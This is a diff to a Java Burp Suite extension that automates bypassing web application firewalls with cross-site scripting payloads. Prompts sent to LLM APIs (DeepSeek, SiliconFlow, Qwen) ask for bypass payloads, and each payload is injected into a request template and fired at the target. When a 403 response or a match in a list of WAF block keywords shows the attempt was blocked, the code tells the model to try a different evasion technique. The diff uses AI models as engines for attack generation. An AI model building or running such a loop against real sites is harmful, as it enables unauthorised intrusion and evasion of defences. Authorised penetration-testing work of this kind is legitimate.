+            if (extractedPayload != null && !extractedPayload.isEmpty()) {
+                logToUI("从AI响应中提取到payload: " + extractedPayload);
+                // 1) 用模板替换 <xss>
+                if (originalTemplate == null || originalTemplate.isEmpty()) {
+                    handleRequestExtractionFailure(sessionState, "originalTemplate 为空，请先确认模板");
+                    return;
+                }
+                String finalRequest = buildFinalRequest(originalTemplate, extractedPayload);
+
+                // 2) 校验并修正请求
+                finalRequest = validateAndFixRequest(finalRequest);
+                if (finalRequest == null) {
+                    handleRequestExtractionFailure(sessionState, "无法验证拼接后的请求");
+                    return;
+                }
+
+                // 3) 发送请求
+                processValidRequest(finalRequest, sessionState);
+            } else {
+                // 如果重试多次后依然没有提取到payload，则发送原始数据包
+                logToUI("重试 " + maxRetries + " 次后仍未提取到有效payload，使用原始请求发送数据包");
+                processValidRequest(requestTextArea.getText(), sessionState);
+            }
+
 
 
 // 为不同的API提供商设置不同的延迟时间
@@ -872,10 +860,25 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 isRunning = false;
                 sendToAIButton.setEnabled(true);
                 stopButton.setEnabled(false);
-                SwingUtilities.invokeLater(() -> manualFixButton.setEnabled(false));
                 logToUI("由于错误，AI会话停止");
             });
         }
+    }
+    /**
+     * 判断响应文本中是否包含 WAF 拦截的关键词
+     */
+    private boolean isWafIntercepted(String responseText) {
+        if (responseText == null) {
+            return false;
+        }
+        String lowerText = responseText.toLowerCase();
+        return lowerText.contains("waf") || lowerText.contains("被拦截") ||
+                lowerText.contains("安全狗") || lowerText.contains("雷池") ||
+                lowerText.contains("防火墙拦截") || lowerText.contains("造成威胁") ||
+                lowerText.contains("攻击行为") || lowerText.contains("反馈误报") ||
+                lowerText.contains("黑客攻击") || lowerText.contains("危险内容") ||
+                lowerText.contains("不合法") || lowerText.contains("拦截") ||
+                lowerText.contains("宝塔") || lowerText.contains("创宇盾");
     }
 
     // 新增：处理请求提取失败的方法
@@ -885,18 +888,13 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 
 // 在UI线程中更新UI状态
         SwingUtilities.invokeLater(() -> {
-// 设置标志，表示正在等待手动修复
-            sessionState.setWaitingForManualFix(true);
-            manualFixButton.setEnabled(true);
 
 // 提示用户修复请求
-            String message = errorMessage + "\n\n你可以:\n" +
-                    "1. 在“请求”选项卡中手动修复请求，然后单击“Manual Fix & Continue”'\n" +
-                    "2. 或者单击“停止”结束会话";
+            String message = errorMessage + "\n,AI卡死报错，点击停止分析，点击清除全部记录，重新开始！！！'\n";
             JOptionPane.showMessageDialog(
                     mainPanel,
                     message,
-                    "Request Extraction Error",
+                    "得,AI被你搞坏了吧",
                     JOptionPane.WARNING_MESSAGE
             );
 
@@ -944,7 +942,6 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 isRunning = false;
                 sendToAIButton.setEnabled(true);
                 stopButton.setEnabled(false);
-                manualFixButton.setEnabled(false);
                 logToUI("AI会话因错误而停止");
             });
         }
@@ -996,7 +993,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
             }
         }
 
-        /* 检查响应 */
+        //检查响应
         if (httpRequestResponse == null || httpRequestResponse.getResponse() == null) {
             throw new Exception("未收到目标响应");
         }
@@ -1007,6 +1004,33 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
         String responseText = new String(responseBytes, StandardCharsets.UTF_8);
         IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
         logToUI("收到目标的响应 (Status: " + responseInfo.getStatusCode() + ")");
+
+// 新增判断：如果状态码为403等且响应文本中含有 WAF 拦截关键词，则只向 AI 发送简化信息
+        int status = responseInfo.getStatusCode();
+        if (status == 403 || status == 400 || status == 502 || status == 500 || isWafIntercepted(responseText)) {
+            // 构造简化的用户消息，告知 AI 上一轮 payload 被拦截
+            String simplifiedUserContent = "HTTP Response: " + status +
+                    "已经判断为被WAF拦截，请你重新生成payload尝试绕过waf，严格遵守开始的规则提示词，此外下次生成payload使用其他绕过思路，不要和上次payload使用相同的手法";
+            JSONObject simplifiedUserMessage = new JSONObject();
+            simplifiedUserMessage.put("role", "user");
+            simplifiedUserMessage.put("content", simplifiedUserContent);
+            messageHistory.add(simplifiedUserMessage);
+            logToUI("检测到状态码 " + status + " 或关键词匹配，向 AI 发送简化信息以生成新的 payload。");
+        } else {
+            // 正常情况：提交完整的请求和响应信息
+            // 构造下一次对话的用户消息时，对请求和响应内容进行截断
+            String nextUserContent = "Modified HTTP Request:\n\n"
+                    + truncateContent(validRequest, 3000)
+                    + "\n\nHTTP Response:\n\n"
+                    + truncateContent(responseText, 3000);
+            JSONObject nextUserMessage = new JSONObject();
+            nextUserMessage.put("role", "user");
+            nextUserMessage.put("content", nextUserContent);
+
+// 裁剪历史再添加新消息
+            trimMessageHistory();
+            messageHistory.add(nextUserMessage);
+        }
 
 // 更新UI上的请求/响应文本区域
         final String finalRequest = validRequest;
@@ -1081,7 +1105,6 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
         SwingUtilities.invokeLater(() -> {
             sendToAIButton.setEnabled(true);
             stopButton.setEnabled(false);
-            manualFixButton.setEnabled(false);
         });
     }
 
@@ -1092,7 +1115,6 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
     private void logToUI(String message) {
         SwingUtilities.invokeLater(() -> {
             logTextArea.append("[" + new java.util.Date() + "] " + message + "\n");
-// Auto-scroll to bottom
             logTextArea.setCaretPosition(logTextArea.getDocument().getLength());
         });
     }
@@ -1113,7 +1135,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
         JSONObject json = new JSONObject();
         json.put("model", "deepseek-chat");
 
-// Convert message history to JSONArray
+        // 将消息历史转换为JSONArray
         JSONArray messagesArray = new JSONArray();
         for (JSONObject message : messageHistory) {
             messagesArray.put(message);
@@ -1140,15 +1162,13 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 
         String responseStr = response.toString();
         logToConsole("收到来自DeepSeek的原始响应: " + responseStr);
-
-        // JSONObject responseJson = new JSONObject(responseStr)
         JSONObject responseJson;
         try {
             responseJson = new JSONObject(responseStr);
         } catch (Exception ex) {
-            logToUI("返回的不是合法JSON，丢弃该响应，继续执行...");
+            logToUI("返回的不是合法JSON，可能是由于请求历史过长导致截断或错误。请检查历史记录是否过大，并尝试清理部分历史。");
             logToConsole("异常信息：" + ex.getMessage());
-            return "";  // 返回空字符串，程序不抛异常，可以继续
+            return "Error: 响应异常，可能是上下文超限";
         }
 
         String aiResponse = responseJson.getJSONArray("choices")
@@ -1204,21 +1224,15 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
             modelName = "ft:";
         }
         json.put("model", modelName);
-
-// Convert message history to JSONArray
-// For SiliconFlow we need to handle differently since the API might work differently
         JSONArray messagesArray = new JSONArray();
-
-// Add system message content to user message if present
         String systemContent = "";
         if (!messageHistory.isEmpty() && "system".equals(messageHistory.get(0).getString("role"))) {
             systemContent = messageHistory.get(0).getString("content") + "\n\n";
         }
 
-// Add all user and assistant messages
+
         for (int i = 1; i < messageHistory.size(); i++) {
             JSONObject message = messageHistory.get(i);
-// For first user message, prepend system content
             if (i == 1 && "user".equals(message.getString("role"))) {
                 JSONObject modifiedMessage = new JSONObject();
                 modifiedMessage.put("role", "user");
@@ -1234,7 +1248,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
         json.put("max_tokens", 4096);
 
         String jsonBody = json.toString();
-        logToConsole("Sending JSON to SiliconFlow: " + jsonBody);
+        logToConsole("向SiliconFlow发送JSON: " + jsonBody);
 
         try (OutputStream os = connection.getOutputStream()) {
             byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
@@ -1280,11 +1294,8 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
             modelName = "qwen-plus";
         }
         json.put("model", modelName);
-
-// Convert message history to JSONArray
         JSONArray messagesArray = new JSONArray();
 
-// 添加所有消息，确保结构符合阿里云API要求
         for (JSONObject message : messageHistory) {
             messagesArray.put(message);
         }
@@ -1518,7 +1529,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
         }
     }
 
-    private String extractRequestFromAIResponse(String aiResponse) {
+    /*private String extractRequestFromAIResponse(String aiResponse) {
         logToConsole("Extracting request from AI response");
 
 // 查找代码块格式的请求
@@ -1598,9 +1609,92 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 // 如果还是没找到合适的请求，返回错误
         logToConsole("No valid HTTP request found in AI response");
         return null;
+    }*/
+    /**
+     * 将模板请求中的 <xss> 替换为 AI 给的 payload
+     */
+    private String buildFinalRequest(String requestTemplate, String payload) {
+        if (requestTemplate == null || requestTemplate.isEmpty()) {
+            logToConsole("Warning: requestTemplate 为空");
+            return null;
+        }
+        if (!requestTemplate.contains("<xss>")) {
+            logToConsole("Warning: 模板中未找到 <xss> 占位符");
+        }
+        // 使用正则表达式进行替换，(?i)表示忽略大小写
+        String finalRequest = requestTemplate.replaceAll("(?i)\\Q<xss>\\E", Matcher.quoteReplacement(payload));
+        logToConsole("最终请求内容:\n" + finalRequest);
+        return finalRequest;
+    }
+    //从 AI 响应中提取出 payload 字符串
+
+    private String extractPayloadFromAIResponse(String aiResponse) {
+        if (aiResponse == null || aiResponse.trim().isEmpty()) {
+            return null;
+        }
+        String lowerResp = aiResponse.toLowerCase();
+
+        // 查找 "bypass_payload:" 或 "本轮payload:"
+        int idxBypass = lowerResp.indexOf("bypass_payload:");
+        int idxBenlun = lowerResp.indexOf("下一轮payload:");
+
+        // 优先判断 bypass_payload
+        if (idxBypass != -1) {
+            return parsePayload(aiResponse, idxBypass + "bypass_payload:".length());
+        } else if (idxBenlun != -1) {
+            return parsePayload(aiResponse, idxBenlun + "下一轮payload:".length());
+        }
+
+        // 如果都没找到，就返回 null
+        return null;
+    }
+    private void sendCurrentRequestToRepeater() {
+        try {
+            // 从文本框获取请求字符串
+            String requestString = requestTextArea.getText();
+            if (requestString == null || requestString.trim().isEmpty()) {
+                logToUI("没有可发送到 Repeater 的请求");
+                return;
+            }
+
+            // 转成字节数组（用 UTF-8 编码）
+            byte[] requestBytes = requestString.getBytes(StandardCharsets.UTF_8);
+
+            // 从当前扩展中拿到 httpService 信息
+            if (currentHttpService == null) {
+                logToUI("缺少 HTTP Service 信息，无法发送到 Repeater");
+                return;
+            }
+
+            // 获取 host/port/protocol
+            String host = currentHttpService.getHost();
+            int port = currentHttpService.getPort();
+            boolean isSsl = "https".equalsIgnoreCase(currentHttpService.getProtocol());
+
+            // 调用 Burp 提供的 sendToRepeater 方法
+            callbacks.sendToRepeater(host, port, isSsl, requestBytes, "xss");
+            logToUI("已将请求发送到 Repeater");
+        } catch (Exception e) {
+            logToUI("发送到 Repeater 失败: " + e.getMessage());
+        }
     }
 
     /**
+     * 从指定起始位置开始，读取到下一行或字符串结尾，作为payload
+     */
+    private String parsePayload(String fullText, int startIndex) {
+        // 定义结束标记
+        String endMarker = "--payload-end--";
+        int endIndex = fullText.indexOf(endMarker, startIndex);
+        if (endIndex == -1) {
+            // 如果没有找到结束标记，就读取到字符串末尾
+            endIndex = fullText.length();
+        }
+        return fullText.substring(startIndex, endIndex).trim();
+    }
+
+
+        /**
      * 验证和修复HTTP请求格式 - 重构后的方法，确保正确处理HTTP请求格式
      */
     private String validateAndFixRequest(String request) {
@@ -1927,7 +2021,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
     }
 
     private class HistoryTableModel extends AbstractTableModel {
-        private final String[] columnNames = {"#", "Request Length", "Response Length", "Status", "XSS Success"};
+        private final String[] columnNames = {"#", "Request Length", "Response Length", "Status", "绕过判定"};
 
         @Override
         public int getRowCount() {
@@ -1956,6 +2050,7 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                 case 2:
                     return pair.getResponse().length;
                 case 3:
+                    // 显示真实响应码
                     try {
                         IResponseInfo responseInfo = helpers.analyzeResponse(pair.getResponse());
                         return responseInfo.getStatusCode();
@@ -1963,40 +2058,39 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
                         return "Error";
                     }
                 case 4:
-                    // 这里是对「XSS Success」列的逻辑判断
+                    // XSS Success列，需要优先使用真实响应码判断
                     try {
                         IResponseInfo responseInfo = helpers.analyzeResponse(pair.getResponse());
                         int statusCode = responseInfo.getStatusCode();
 
-                        // 1) 如果状态码是 403，直接判定为被拦截
-                        if (statusCode == 403) {
-                            return "被拦截";
-                        }
-
-                        // 2) 否则根据 AI 的响应内容判断
+                        // AI 分析的文本
                         String aiResp = pair.getAiResponse().toLowerCase();
 
-                        // 如果还在等待AI分析...
-                        if ("等待ai分析...".equals(aiResp)) {
-                            return "等待分析";
+                        // ---------- 这里是关键修改 ----------
+                        // 1) 如果状态码是 403/400/401/406/40X，就判定为WAF拦截
+                        if (statusCode == 403 || statusCode == 400
+                                || statusCode == 401 || statusCode == 406
+                                || (statusCode >= 400 && statusCode < 500)) {
+                            return "WAF拦截"; // 你可以根据需要再细化
                         }
-                        // 如果包含 xss成功、成功注入等关键词
-                        else if (aiResp.contains("xss成功")
-                                || aiResp.contains("成功注入")
-                                || aiResp.contains("payload成功执行")
-                                || aiResp.contains("绕过了waf")
-                                || (aiResp.contains("alert") && aiResp.contains("成功"))) {
-                            return "已绕过WAF,请手工测试";
-                        }
-                        // 如果包含被拦截、被过滤、无法绕过等
-                        else if (aiResp.contains("被拦截")
-                                || aiResp.contains("waf拦截")
-                                || aiResp.contains("被过滤")
-                                || aiResp.contains("依然被拦截")) {
-                            return "WAF拦截";
+                        // 2) 如果状态码 2xx，才考虑是否“已绕过”
+                        else if (statusCode >= 200 && statusCode < 300) {
+                            // 如果AI响应包含“成功”/“绕过”等关键词
+                            if (aiResp.contains("xss成功")
+                                    || aiResp.contains("成功注入")
+                                    || aiResp.contains("已绕过")
+                                    || aiResp.contains("未被WAF拦截")
+                                    || aiResp.contains("绕过了waf")) {
+                                return "已绕过WAF";
+                            } else {
+                                // 状态码200，但AI没有明确说成功
+                                return "已绕过WAF,请手工测试";
+                            }
                         } else {
+                            // 其他响应码（301/302/500等），可视需求判断
                             return "未确定";
                         }
+                        // ---------- 关键修改结束 ----------
                     } catch (Exception e) {
                         return "Error";
                     }
